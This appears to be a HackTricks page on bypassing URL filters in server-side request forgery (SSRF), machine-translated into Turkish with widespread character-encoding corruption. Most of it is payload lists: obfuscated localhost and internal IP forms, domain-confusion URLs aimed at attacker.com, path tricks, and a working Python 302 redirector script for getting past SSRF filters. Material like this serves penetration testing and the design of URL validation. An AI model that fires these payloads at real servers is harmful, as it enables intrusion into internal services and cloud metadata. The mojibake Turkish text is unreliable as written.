# URL Format Bypass

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramanla Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** isterseniz [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En Ã¶nemli olan zayÄ±flÄ±klarÄ± bulun, bÃ¶ylece daha hÄ±zlÄ± dÃ¼zeltebilirsiniz. Intruder saldÄ±rÄ± yÃ¼zeyinizi takip eder, proaktif tehdit taramalarÄ± yapar, API'lerden web uygulamalarÄ±na ve bulut sistemlerine kadar tÃ¼m teknoloji yÄ±ÄŸÄ±nÄ±nÄ±zda sorunlarÄ± bulur. [**Ãœcretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugÃ¼n.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

### Localhost
```bash
# Localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://â‘ â‘¡â‘¦.â“ª.â“ª.â“ª

# CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127ã€‚0ã€‚0ã€‚1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```
**Domain Parser**

**Alan AdÄ± AyrÄ±ÅŸtÄ±rÄ±cÄ±**
```bash
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attackerã€‚com
â’¶â“‰â“‰â’¶â’¸â“€â’ºâ“¡.â’¸â“â“œ
```

```
â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾
â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’—
â’˜ â’™ â’š â’› â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’°
â’± â’² â’³ â’´ â’µ â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰
â“Š â“‹ â“Œ â“ â“ â“ â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢
â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿
```
### Alan AdÄ± KarÄ±ÅŸÄ±klÄ±ÄŸÄ±

Domain confusion (alan adÄ± karÄ±ÅŸÄ±klÄ±ÄŸÄ±), SSRF saldÄ±rÄ±larÄ±nda kullanÄ±lan bir tekniktir. Bu teknik, hedef uygulamanÄ±n bir URL'yi iÅŸlerken, alan adÄ± doÄŸrulamasÄ±nÄ± atlamak veya yanÄ±ltmak iÃ§in kullanÄ±lÄ±r. Bu sayede saldÄ±rgan, hedef uygulama Ã¼zerinde istediÄŸi sunucuya istek gÃ¶nderebilir.

Bu teknik, hedef uygulamanÄ±n URL'yi iÅŸlerken, alan adÄ±nÄ± doÄŸrulamak iÃ§in kullanÄ±lan yÃ¶ntemlere dayanÄ±r. Ã–rneÄŸin, uygulama bir URL'nin alan adÄ±nÄ± doÄŸrulamak iÃ§in DNS sorgusu yapabilir veya URL'nin alan adÄ±nÄ± Ã§Ã¶zmek iÃ§in yerel bir DNS sunucusuna baÅŸvurabilir. SaldÄ±rgan, bu doÄŸrulama yÃ¶ntemlerini yanÄ±ltmak veya atlamak iÃ§in farklÄ± alan adÄ± formatlarÄ±nÄ± kullanabilir.

Ã–rneÄŸin, saldÄ±rgan bir SSRF saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmek iÃ§in hedef uygulamaya aÅŸaÄŸÄ±daki URL'yi gÃ¶nderebilir:

```
http://example.com@attacker-server.com
```

Bu URL'de, saldÄ±rgan `example.com` alan adÄ±nÄ± yanÄ±ltÄ±cÄ± bir ÅŸekilde kullanarak, aslÄ±nda `attacker-server.com` adlÄ± sunucuya istek gÃ¶nderir. Hedef uygulama, URL'yi iÅŸlerken `example.com` alan adÄ±nÄ± doÄŸrulamak iÃ§in DNS sorgusu yapabilir, ancak saldÄ±rganÄ±n isteÄŸi `attacker-server.com` sunucusuna yÃ¶nlendirilir.

Domain confusion tekniÄŸi, SSRF saldÄ±rÄ±larÄ±nda etkili bir ÅŸekilde kullanÄ±labilir. Bu nedenle, uygulama geliÅŸtiricilerinin URL iÅŸleme ve alan adÄ± doÄŸrulama yÃ¶ntemlerini dikkatlice gÃ¶zden geÃ§irmeleri Ã¶nemlidir.
```bash
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com

# On each IP position try to put 1 attackers domain and the others the victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

#Parameter pollution
next={domain}&next=attacker.com
```
### Yollar ve UzantÄ±lar GeÃ§me

EÄŸer URL'nin bir yol veya uzantÄ± ile bitmesi veya bir yol iÃ§ermesi gerekiyorsa, aÅŸaÄŸÄ±daki geÃ§iÅŸ yÃ¶ntemlerinden birini deneyebilirsiniz:
```
https://metadata/vulerable/path#/expected/path
https://metadata/vulerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
```
### Fuzzing

[**recollapse**](https://github.com/0xacb/recollapse) adlÄ± araÃ§, kullanÄ±lan regex'i atlamak iÃ§in verilen bir girdiden Ã§eÅŸitlilikler Ã¼retebilir. Daha fazla bilgi iÃ§in [**bu yazÄ±yÄ±**](https://0xacb.com/2022/11/21/recollapse/) kontrol edin.

### YÃ¶nlendirme ile bypass

Sunucunun, bir SSRF'nin **orijinal isteÄŸini filtrelediÄŸi** ancak olasÄ± bir **yÃ¶nlendirme** yanÄ±tÄ±nÄ± filtrelemediÄŸi mÃ¼mkÃ¼n olabilir.\
Ã–rneÄŸin, `url=https://www.google.com/` Ã¼zerinden SSRF'ye karÅŸÄ± savunmasÄ±z bir sunucu, url parametresini **filtreleyebilir**. Ancak, yÃ¶nlendirmek istediÄŸiniz yere bir [python sunucusuyla 302 yanÄ±tÄ±](https://pastebin.com/raw/ywAUhFrv) kullanÄ±rsanÄ±z, 127.0.0.1 gibi filtrelenmiÅŸ IP adreslerine veya hatta filtrelenmiÅŸ **protokollere** (Ã¶rneÄŸin gopher) **eriÅŸebilirsiniz**.\
[Bu rapora gÃ¶z atÄ±n.](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)
```python
#!/usr/bin/env python3

#python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
print("Usage: {} <port_number> <url>".format(sys.argv[0]))
sys.exit()

class Redirect(BaseHTTPRequestHandler):
def do_GET(self):
self.send_response(302)
self.send_header('Location', sys.argv[2])
self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
## AÃ§Ä±klanan Hileler

### TersbÃ¶lÃ¼ iÅŸareti hilesi

*TersbÃ¶lÃ¼ iÅŸareti hilesi*, [WHATWG URL StandardÄ±](https://url.spec.whatwg.org/#url-parsing) ve [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B) arasÄ±ndaki bir farkÄ± sÃ¶mÃ¼rÃ¼r. RFC3986, URI'ler iÃ§in genel bir Ã§erÃ§eve iken WHATWG, web URL'leri iÃ§in Ã¶zeldir ve modern tarayÄ±cÄ±lar tarafÄ±ndan benimsenmiÅŸtir. Temel fark, WHATWG standardÄ±nÄ±n tersbÃ¶lÃ¼ iÅŸaretini (`\`) ileri eÄŸik Ã§izgi (`/`) ile eÅŸdeÄŸer olarak tanÄ±masÄ±dÄ±r. Bu, URL'lerin nasÄ±l ayrÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nÄ± etkiler ve Ã¶zellikle bir URL'deki ana bilgisayardan yola geÃ§iÅŸi iÅŸaretler.

![https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec_difference.jpg](https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec\_difference.jpg)

### DiÄŸer KarÄ±ÅŸÄ±klÄ±klar

![https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](<../../.gitbook/assets/image (629).png>)

Resim kaynaÄŸÄ±: [https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)


## Referanslar
* [https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25](https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En Ã¶nemli gÃ¼venlik aÃ§Ä±klarÄ±nÄ± bulun, bÃ¶ylece daha hÄ±zlÄ± dÃ¼zeltebilirsiniz. Intruder saldÄ±rÄ± yÃ¼zeyinizi takip eder, proaktif tehdit taramalarÄ± yapar, API'lerden web uygulamalarÄ±na ve bulut sistemlerine kadar tÃ¼m teknoloji yÄ±ÄŸÄ±nÄ±nÄ±zda sorunlarÄ± bulur. [**Ãœcretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugÃ¼n.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana dÃ¶nÃ¼ÅŸmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklam vermek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki Ã¶zel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da takip edin ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live).
* Hacking hilelerinizi gÃ¶ndererek HackTricks ve HackTricks Cloud github depolarÄ±na katkÄ±da bulunun.

</details>
